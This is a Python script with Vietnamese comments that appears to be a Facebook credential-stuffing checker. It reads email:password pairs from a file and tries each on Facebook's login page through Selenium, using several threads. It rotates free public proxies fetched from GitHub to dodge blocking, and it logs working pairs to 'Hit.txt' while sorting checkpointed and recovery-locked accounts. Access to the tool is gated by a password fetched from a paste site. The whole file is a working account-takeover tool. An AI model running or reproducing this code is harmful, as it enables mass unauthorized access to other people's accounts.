import requests
from bs4 import BeautifulSoup
import threading
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
import time
import random
import os

url = "https://ctxt.io/2/AAB4Ftx3Ew"

# Hàm lấy văn bản từ một trang web
def get_page_text(url):
    try:
        response = requests.get(url)
        response.encoding = 'utf-8'
        soup = BeautifulSoup(response.text, 'html.parser')
        return ' '.join(soup.get_text().split())
    except Exception as e:
        print(f"Không thể tải trang: {e}")
        return ""

# Hàm kiểm tra mật khẩu từ URL
def check_password_from_url(password, url):
    page_text = get_page_text(url)
    if password.strip() in page_text:
        return True
    return False

# Hàm lấy proxy từ URL
def get_proxies_from_url(proxy_url):
    try:
        response = requests.get(proxy_url)
        proxies = response.text.splitlines()  # Mỗi proxy sẽ được tách ra thành một dòng
        return proxies
    except Exception as e:
        print(f"Không thể tải proxy từ URL: {e}")
        return []

# Hàm tạo driver mới và cấu hình với proxy
def create_driver_with_proxy(proxy=None):
    chrome_options = Options()
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    # Nếu có proxy, thêm proxy vào driver
    if proxy:
        chrome_options.add_argument(f'--proxy-server=http://{proxy}')

    service = Service(ChromeDriverManager().install())
    driver = webdriver.Chrome(service=service, options=chrome_options)
    
    # Xóa cookies sau khi tạo driver mới
    driver.delete_all_cookies()

    return driver

# Hàm kiểm tra tài khoản và xử lý lỗi proxy
def login_and_check_account(driver, email, password, wait_time, proxy, proxies):
    driver.get('https://www.facebook.com/')  # Truy cập vào trang Facebook
    print(f"Đang kiểm tra tài khoản {email} với proxy: {proxy}")  # Hiển thị proxy và tài khoản
    try:
        # Đợi cho các phần tử trên trang đăng nhập Facebook xuất hiện
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "email"))
        )
        email_input = driver.find_element(By.ID, 'email')  # Trường nhập email
        password_input = driver.find_element(By.ID, 'pass')  # Trường nhập mật khẩu
        email_input.send_keys(email)
        password_input.send_keys(password)
        password_input.send_keys(Keys.RETURN)  # Gửi form đăng nhập
        time.sleep(wait_time)

        # Kiểm tra xem có phải là thông báo "Mật khẩu bạn nhập không chính xác" không
        try:
            error_message = driver.find_element(By.XPATH, "//div[contains(text(), 'Mật khẩu bạn nhập không chính xác')]")
            print(f"\033[1;31mKhông đăng nhập được với tài khoản: {email} \033[0m")
            return False
        except:
            pass

        # Kiểm tra nếu URL chứa "https://www.facebook.com/recover"
        if 'https://www.facebook.com/recover' in driver.current_url:
            print(f"\033[1;31mKhông đăng nhập được với tài khoản: {email} - Lỗi: Cần khôi phục tài khoản.\033[0m")
            return False

        # Kiểm tra URL sau khi đăng nhập thành công
        if 'https://www.facebook.com/checkpoint/' in driver.current_url:
            print(f"\033[1;36mCheckpoint: {email}\033[0m")
            return False
        elif driver.current_url == "https://www.facebook.com/":
            print(f"\033[1;32mĐã đăng nhập thành công với tài khoản: {email}:{password}\033[0m")
            with open('Hit.txt', 'a') as hit_file:
                hit_file.write(f"{email}:{password}\n")
            return True
        else:
            print(f"\033[1;31mKhông đăng nhập được với tài khoản: {email}\033[0m")
            return False
    except Exception as e:
        print(f"\033[1;31mKhông thể truy cập Facebook với proxy: {proxy}\033[0m")
        
        # Nếu lỗi truy cập, chọn proxy mới và thử lại
        new_proxy = random.choice(proxies)
        print(f"Đang thử proxy mới: {new_proxy}")
        driver.quit()  # Đóng driver hiện tại
        return login_and_check_account(create_driver_with_proxy(new_proxy), email, password, wait_time, new_proxy, proxies)  # Tạo driver mới với proxy khác và thử lại

# Hàm xóa màn hình
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

# Hàm thử đăng nhập và kiểm tra Facebook
def try_login_and_check_facebook(url, proxy_url):
    attempts = 0
    max_attempts = 3
    num_drivers = int(input("Nhập số lượng driver bạn muốn sử dụng: "))
    wait_time = float(input("Nhập thời gian chờ (đơn vị giây) trước khi kiểm tra tài khoản: "))
    
    proxies = get_proxies_from_url(proxy_url)  # Lấy proxy từ URL

    if not proxies:
        print("Không có proxy nào để sử dụng.")
        return

    while attempts < max_attempts:
        password = input("Nhập mật khẩu của bạn: ")

        if check_password_from_url(password, url):
            print("Đăng nhập thành công!")
            clear()
            with open('NFA.txt', 'r') as file:
                lines = file.readlines()
            accounts_per_driver = [lines[i::num_drivers] for i in range(num_drivers)]
            threads = []
            for i in range(num_drivers):
                accounts = [(line.strip().split(':')[0], line.strip().split(':')[1]) for line in accounts_per_driver[i]]
                proxy = random.choice(proxies)  # Chọn một proxy ngẫu nhiên từ danh sách
                thread = threading.Thread(target=check_account_for_driver, args=(accounts, wait_time, proxy, proxies))
                threads.append(thread)
                thread.start()
            for thread in threads:
                thread.join()
            break
        else:
            print("Mật khẩu sai!")
        attempts += 1
    if attempts == max_attempts:
        print("Đã hết số lần thử, đăng xuất.")

# Hàm kiểm tra tài khoản cho từng driver
def check_account_for_driver(accounts, wait_time, proxy, proxies):
    for email, password in accounts:
        driver = create_driver_with_proxy(proxy)  # Tạo driver với proxy
        print(f"Đang kiểm tra tài khoản: {email} với proxy: {proxy}")  # Hiển thị proxy đang sử dụng
        login_and_check_account(driver, email, password, wait_time, proxy, proxies)
        driver.quit()

# Bắt đầu thử đăng nhập và kiểm tra tài khoản
proxy_url = "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt"  # Sửa URL RAW
try_login_and_check_facebook(url, proxy_url)
